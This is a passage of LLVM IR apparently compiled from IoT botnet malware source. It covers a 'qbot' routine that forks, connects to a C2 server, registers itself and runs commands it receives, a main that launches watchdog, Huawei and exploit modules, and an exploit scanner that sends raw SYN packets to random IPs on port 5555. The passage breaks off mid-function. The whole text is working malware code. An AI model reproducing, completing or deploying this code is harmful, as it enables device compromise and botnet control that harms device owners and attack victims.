  %40 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 0
  call void @proc_cmd(i32 noundef %39, i8** noundef %40)
  br label %41

41:                                               ; preds = %38, %35
  store i32 0, i32* %3, align 4
  br label %42

42:                                               ; preds = %51, %41
  %43 = load i32, i32* %3, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %54

46:                                               ; preds = %42
  %47 = load i32, i32* %3, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %48
  %50 = load i8*, i8** %49, align 8
  call void @free(i8* noundef %50) #11
  br label %51

51:                                               ; preds = %46
  %52 = load i32, i32* %3, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %3, align 4
  br label %42, !llvm.loop !22

54:                                               ; preds = %42
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @qbot() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [11 x i8*], align 16
  %4 = call i32 @fork() #11
  %5 = icmp sgt i32 %4, 0
  br i1 %5, label %6, label %7

6:                                                ; preds = %0
  br label %75

7:                                                ; preds = %0
  store i32 0, i32* %2, align 4
  %8 = bitcast [11 x i8*]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 88, i1 false)
  %9 = call i32 @resolve_http()
  br label %10

10:                                               ; preds = %40, %7
  %11 = load i32, i32* @C2, align 4
  %12 = load i32, i32* @C2, align 4
  %13 = call i32 (i32, i32, ...) @fcntl(i32 noundef %12, i32 noundef 3, i32 noundef 0)
  %14 = or i32 %13, 2048
  %15 = call i32 (i32, i32, ...) @fcntl(i32 noundef %11, i32 noundef 4, i32 noundef %14)
  %16 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #11
  store i32 %16, i32* @C2, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %22

18:                                               ; preds = %10
  %19 = load i32, i32* @C2, align 4
  %20 = call i32 @close(i32 noundef %19)
  %21 = call i32 @close(i32 noundef 0)
  br label %22

22:                                               ; preds = %18, %10
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 0), align 4
  %23 = call i32 @inet_addr(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i64 0, i64 0)) #11
  store i32 %23, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 2, i32 0), align 4
  %24 = load i32, i32* @c2_bot_port, align 4
  %25 = trunc i32 %24 to i16
  %26 = call zeroext i16 @htons(i16 noundef zeroext %25) #10
  store i16 %26, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 1), align 2
  %27 = load i32, i32* @C2, align 4
  %28 = call i32 @connect(i32 noundef %27, %struct.sockaddr* noundef bitcast (%struct.sockaddr_in* @Socket to %struct.sockaddr*), i32 noundef 16)
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %30, label %47

30:                                               ; preds = %22
  %31 = load i32, i32* @retry, align 4
  %32 = icmp eq i32 %31, 3
  br i1 %32, label %33, label %37

33:                                               ; preds = %30
  %34 = load i32, i32* @C2, align 4
  %35 = call i32 @close(i32 noundef %34)
  %36 = call i32 @close(i32 noundef 0)
  br label %46

37:                                               ; preds = %30
  %38 = load i32, i32* @tryagain, align 4
  %39 = icmp eq i32 %38, 1
  br i1 %39, label %40, label %45

40:                                               ; preds = %37
  %41 = load i32, i32* @C2, align 4
  %42 = call i32 @close(i32 noundef %41)
  %43 = load i32, i32* @retry, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* @retry, align 4
  br label %10

45:                                               ; preds = %37
  br label %46

46:                                               ; preds = %45, %33
  br label %75

47:                                               ; preds = %22
  call void @registerme(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.69, i64 0, i64 0))
  br label %48

48:                                               ; preds = %71, %47
  %49 = load i32, i32* @C2, align 4
  %50 = call i64 @read(i32 noundef %49, i8* noundef getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i64 noundef 1024)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* @buffer, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %72

53:                                               ; preds = %48
  %54 = load i32, i32* @buffer, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* @buf, i64 0, i64 %55
  store i8 0, i8* %56, align 1
  %57 = call i8* @strstr(i8* noundef getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i64 0, i64 0)) #12
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %62

59:                                               ; preds = %53
  %60 = load i32, i32* @C2, align 4
  %61 = call i64 @write(i32 noundef %60, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i64 0, i64 0), i64 noundef 6)
  br label %62

62:                                               ; preds = %59, %53
  %63 = call i8* @strstr(i8* noundef getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.72, i64 0, i64 0)) #12
  %64 = icmp ne i8* %63, null
  br i1 %64, label %65, label %66

65:                                               ; preds = %62
  br label %72

66:                                               ; preds = %62
  %67 = load i8*, i8** @trigger, align 8
  %68 = call i8* @strstr(i8* noundef getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* noundef %67) #12
  %69 = icmp ne i8* %68, null
  br i1 %69, label %70, label %71

70:                                               ; preds = %66
  call void @parse_buffer(i8* noundef getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0))
  br label %71

71:                                               ; preds = %70, %66
  br label %48, !llvm.loop !23

72:                                               ; preds = %65, %48
  %73 = load i32, i32* @C2, align 4
  %74 = call i32 @close(i32 noundef %73)
  call void @exit(i32 noundef 0) #14
  unreachable

75:                                               ; preds = %46, %6
  ret void
}

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @main(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  call void @qbot()
  call void @table_init()
  call void @watchdog_maintain()
  %7 = call i32 @rand() #11
  %8 = srem i32 %7, 1
  store i32 %8, i32* %6, align 4
  %9 = load i32, i32* %6, align 4
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %11, label %12

11:                                               ; preds = %2
  call void (...) bitcast (void ()* @huawei_init to void (...)*)()
  br label %17

12:                                               ; preds = %2
  %13 = load i32, i32* %6, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %12
  call void (...) bitcast (void ()* @exploit_init to void (...)*)()
  br label %16

16:                                               ; preds = %15, %12
  br label %17

17:                                               ; preds = %16, %11
  %18 = load i32, i32* %3, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @exploit_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set*, align 8
  %26 = alloca i32, align 4
  %27 = alloca %struct.fd_set*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #11
  store i32 %34, i32* @exploit_scanner_pid, align 4
  %35 = load i32, i32* @exploit_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

37:                                               ; preds = %0
  %38 = load i32, i32* @exploit_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

40:                                               ; preds = %37, %0
  ret void

41:                                               ; preds = %37
  %42 = call i32 @util_local_addr()
  store i32 %42, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %43 = call i64 @time(i64* noundef null) #11
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* @exploit_fake_time, align 4
  %45 = call noalias i8* @calloc(i64 noundef 128, i64 noundef 5416) #11
  %46 = bitcast i8* %45 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %46, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %47

47:                                               ; preds = %61, %41
  %48 = load i32, i32* %1, align 4
  %49 = icmp slt i32 %48, 128
  br i1 %49, label %50, label %64

50:                                               ; preds = %47
  %51 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %51, i64 %53
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  store i32 0, i32* %55, align 8
  %56 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %57 = load i32, i32* %1, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %56, i64 %58
  %60 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i32 0, i32 0
  store i32 -1, i32* %60, align 8
  br label %61

61:                                               ; preds = %50
  %62 = load i32, i32* %1, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %1, align 4
  br label %47, !llvm.loop !24

64:                                               ; preds = %47
  %65 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #11
  store i32 %65, i32* @exploit_rsck, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %64
  call void @exit(i32 noundef 0) #14
  unreachable

68:                                               ; preds = %64
  %69 = load i32, i32* @exploit_rsck, align 4
  %70 = load i32, i32* @exploit_rsck, align 4
  %71 = call i32 (i32, i32, ...) @fcntl(i32 noundef %70, i32 noundef 3, i32 noundef 0)
  %72 = or i32 2048, %71
  %73 = call i32 (i32, i32, ...) @fcntl(i32 noundef %69, i32 noundef 4, i32 noundef %72)
  store i32 1, i32* %1, align 4
  %74 = load i32, i32* @exploit_rsck, align 4
  %75 = bitcast i32* %1 to i8*
  %76 = call i32 @setsockopt(i32 noundef %74, i32 noundef 0, i32 noundef 3, i8* noundef %75, i32 noundef 4) #11
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %81

78:                                               ; preds = %68
  %79 = load i32, i32* @exploit_rsck, align 4
  %80 = call i32 @close(i32 noundef %79)
  call void @exit(i32 noundef 0) #14
  unreachable

81:                                               ; preds = %68
  br label %82

82:                                               ; preds = %86, %81
  %83 = call i32 @rand_next()
  %84 = and i32 %83, 65535
  %85 = trunc i32 %84 to i16
  store i16 %85, i16* %2, align 2
  br label %86

86:                                               ; preds = %82
  %87 = load i16, i16* %2, align 2
  %88 = call zeroext i16 @ntohs(i16 noundef zeroext %87) #10
  %89 = zext i16 %88 to i32
  %90 = icmp slt i32 %89, 1024
  br i1 %90, label %82, label %91, !llvm.loop !25

91:                                               ; preds = %86
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i64 1
  %94 = bitcast %struct.iphdr* %93 to %struct.anon.0*
  store %struct.anon.0* %94, %struct.anon.0** %4, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %96 = bitcast %struct.iphdr* %95 to i8*
  %97 = load i8, i8* %96, align 4
  %98 = and i8 %97, -16
  %99 = or i8 %98, 5
  store i8 %99, i8* %96, align 4
  %100 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %101 = bitcast %struct.iphdr* %100 to i8*
  %102 = load i8, i8* %101, align 4
  %103 = and i8 %102, 15
  %104 = or i8 %103, 64
  store i8 %104, i8* %101, align 4
  %105 = call zeroext i16 @htons(i16 noundef zeroext 40) #10
  %106 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 2
  store i16 %105, i16* %107, align 2
  %108 = call i32 @rand_next()
  %109 = trunc i32 %108 to i16
  %110 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 3
  store i16 %109, i16* %111, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 5
  store i8 64, i8* %113, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 6
  store i8 6, i8* %115, align 1
  %116 = call zeroext i16 @htons(i16 noundef zeroext 5555) #10
  %117 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %118 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %117, i32 0, i32 1
  store i16 %116, i16* %118, align 2
  %119 = load i16, i16* %2, align 2
  %120 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %121 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %120, i32 0, i32 0
  store i16 %119, i16* %121, align 4
  %122 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %123 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -241
  %126 = or i16 %125, 80
  store i16 %126, i16* %123, align 4
  %127 = call i32 @rand_next()
  %128 = and i32 %127, 65535
  %129 = trunc i32 %128 to i16
  %130 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 5
  store i16 %129, i16* %131, align 2
  %132 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %133 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -513
  %136 = or i16 %135, 512
  store i16 %136, i16* %133, align 4
  br label %137

137:                                              ; preds = %730, %91
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %138 = load i32, i32* @exploit_fake_time, align 4
  %139 = load i32, i32* %10, align 4
  %140 = icmp ne i32 %138, %139
  br i1 %140, label %141, label %205

141:                                              ; preds = %137
  %142 = load i32, i32* @exploit_fake_time, align 4
  store i32 %142, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %143

143:                                              ; preds = %201, %141
  %144 = load i32, i32* %1, align 4
  %145 = icmp slt i32 %144, 160
  br i1 %145, label %146, label %204

146:                                              ; preds = %143
  %147 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %147, i8 0, i64 16, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %148 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i64 1
  %150 = bitcast %struct.iphdr* %149 to %struct.anon.0*
  store %struct.anon.0* %150, %struct.anon.0** %16, align 8
  %151 = call i32 @rand_next()
  %152 = trunc i32 %151 to i16
  %153 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i32, i32* @LOCAL_ADDR, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 8
  store i32 %155, i32* %157, align 4
  %158 = call i32 @get_random_ip()
  %159 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 7
  store i16 0, i16* %162, align 2
  %163 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %164 = bitcast %struct.iphdr* %163 to i16*
  %165 = call zeroext i16 @checksum_generic(i16* noundef %164, i32 noundef 20)
  %166 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 7
  store i16 %165, i16* %167, align 2
  %168 = call zeroext i16 @htons(i16 noundef zeroext 5555) #10
  %169 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 1
  store i16 %168, i16* %170, align 2
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %175 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %174, i32 0, i32 2
  store i32 %173, i32* %175, align 4
  %176 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %177 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %176, i32 0, i32 6
  store i16 0, i16* %177, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %179 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %180 = bitcast %struct.anon.0* %179 to i8*
  %181 = call zeroext i16 @htons(i16 noundef zeroext 20) #10
  %182 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %178, i8* noundef %180, i16 noundef zeroext %181, i32 noundef 20)
  %183 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %184 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %183, i32 0, i32 6
  store i16 %182, i16* %184, align 4
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  %188 = load i32, i32* %187, align 4
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %188, i32* %190, align 4
  %191 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %192 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %191, i32 0, i32 1
  %193 = load i16, i16* %192, align 2
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  %195 = load i32, i32* @exploit_rsck, align 4
  %196 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %197 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %197, %struct.sockaddr** %196, align 8
  %198 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %199 = load %struct.sockaddr*, %struct.sockaddr** %198, align 8
  %200 = call i64 @sendto(i32 noundef %195, i8* noundef getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 0), i64 noundef 40, i32 noundef 16384, %struct.sockaddr* %199, i32 noundef 16)
  br label %201

201:                                              ; preds = %146
  %202 = load i32, i32* %1, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %1, align 4
  br label %143, !llvm.loop !26

204:                                              ; preds = %143
  br label %205

205:                                              ; preds = %204, %137
  store i32 0, i32* %9, align 4
  br label %206

206:                                              ; preds = %339, %311, %299, %291, %283, %275, %267, %258, %249, %242, %235, %205
  store i32 0, i32* %18, align 4
  %207 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %208 = bitcast i8* %207 to %struct.iphdr*
  store %struct.iphdr* %208, %struct.iphdr** %20, align 8
  %209 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i64 1
  %211 = bitcast %struct.iphdr* %210 to %struct.anon.0*
  store %struct.anon.0* %211, %struct.anon.0** %21, align 8
  %212 = call i32* @__errno_location() #10
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* @exploit_rsck, align 4
  %214 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %215 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %215, align 8
  %216 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %217 = load %struct.sockaddr*, %struct.sockaddr** %216, align 8
  %218 = call i64 @recvfrom(i32 noundef %213, i8* noundef %214, i64 noundef 1514, i32 noundef 16384, %struct.sockaddr* %217, i32* noundef null)
  %219 = trunc i64 %218 to i32
  store i32 %219, i32* %18, align 4
  %220 = load i32, i32* %18, align 4
  %221 = icmp sle i32 %220, 0
  br i1 %221, label %230, label %222

222:                                              ; preds = %206
  %223 = call i32* @__errno_location() #10
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 11
  br i1 %225, label %230, label %226

226:                                              ; preds = %222
  %227 = call i32* @__errno_location() #10
  %228 = load i32, i32* %227, align 4
  %229 = icmp eq i32 %228, 11
  br i1 %229, label %230, label %231

230:                                              ; preds = %226, %222, %206
  br label %351

231:                                              ; preds = %226
  %232 = load i32, i32* %18, align 4
  %233 = sext i32 %232 to i64
  %234 = icmp ult i64 %233, 40
  br i1 %234, label %235, label %236

235:                                              ; preds = %231
  br label %206

236:                                              ; preds = %231
  %237 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 9
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* @LOCAL_ADDR, align 4
  %241 = icmp ne i32 %239, %240
  br i1 %241, label %242, label %243

242:                                              ; preds = %236
  br label %206

243:                                              ; preds = %236
  %244 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 6
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp ne i32 %247, 6
  br i1 %248, label %249, label %250

249:                                              ; preds = %243
  br label %206

250:                                              ; preds = %243
  %251 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %252 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %251, i32 0, i32 0
  %253 = load i16, i16* %252, align 4
  %254 = zext i16 %253 to i32
  %255 = call zeroext i16 @htons(i16 noundef zeroext 5555) #10
  %256 = zext i16 %255 to i32
  %257 = icmp ne i32 %254, %256
  br i1 %257, label %258, label %259

258:                                              ; preds = %250
  br label %206

259:                                              ; preds = %250
  %260 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %261 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = load i16, i16* %2, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp ne i32 %263, %265
  br i1 %266, label %267, label %268

267:                                              ; preds = %259
  br label %206

268:                                              ; preds = %259
  %269 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = lshr i16 %271, 9
  %273 = and i16 %272, 1
  %274 = icmp ne i16 %273, 0
  br i1 %274, label %276, label %275

275:                                              ; preds = %268
  br label %206

276:                                              ; preds = %268
  %277 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %278 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = lshr i16 %279, 12
  %281 = and i16 %280, 1
  %282 = icmp ne i16 %281, 0
  br i1 %282, label %284, label %283

283:                                              ; preds = %276
  br label %206

284:                                              ; preds = %276
  %285 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %286 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = lshr i16 %287, 10
  %289 = and i16 %288, 1
  %290 = icmp ne i16 %289, 0
  br i1 %290, label %291, label %292

291:                                              ; preds = %284
  br label %206

292:                                              ; preds = %284
  %293 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %294 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = lshr i16 %295, 8
  %297 = and i16 %296, 1
  %298 = icmp ne i16 %297, 0
  br i1 %298, label %299, label %300

299:                                              ; preds = %292
  br label %206

300:                                              ; preds = %292
  %301 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %302 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %301, i32 0, i32 3
  %303 = load i32, i32* %302, align 4
  %304 = call i32 @ntohl(i32 noundef %303) #10
  %305 = sub i32 %304, 1
  %306 = call i32 @htonl(i32 noundef %305) #10
  %307 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 8
  %309 = load i32, i32* %308, align 4
  %310 = icmp ne i32 %306, %309
  br i1 %310, label %311, label %312

311:                                              ; preds = %300
  br label %206

312:                                              ; preds = %300
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %313 = load i32, i32* %9, align 4
  store i32 %313, i32* %18, align 4
  br label %314

314:                                              ; preds = %332, %312
  %315 = load i32, i32* %18, align 4
  %316 = icmp slt i32 %315, 128
  br i1 %316, label %317, label %335

317:                                              ; preds = %314
  %318 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %318, i64 %320
  %322 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %321, i32 0, i32 2
  %323 = load i32, i32* %322, align 8
  %324 = icmp eq i32 %323, 0
  br i1 %324, label %325, label %331

325:                                              ; preds = %317
  %326 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %327 = load i32, i32* %18, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %326, i64 %328
  store %struct.exploit_scanner_connection* %329, %struct.exploit_scanner_connection** %22, align 8
  %330 = load i32, i32* %18, align 4
  store i32 %330, i32* %9, align 4
  br label %335

331:                                              ; preds = %317
  br label %332

332:                                              ; preds = %331
  %333 = load i32, i32* %18, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %18, align 4
  br label %314, !llvm.loop !27

335:                                              ; preds = %325, %314
  %336 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %337 = icmp eq %struct.exploit_scanner_connection* %336, null
  br i1 %337, label %338, label %339

338:                                              ; preds = %335
  br label %351

339:                                              ; preds = %335
  %340 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  %342 = load i32, i32* %341, align 4
  %343 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %344 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %343, i32 0, i32 3
  store i32 %342, i32* %344, align 4
  %345 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %346 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %345, i32 0, i32 0
  %347 = load i16, i16* %346, align 4
  %348 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
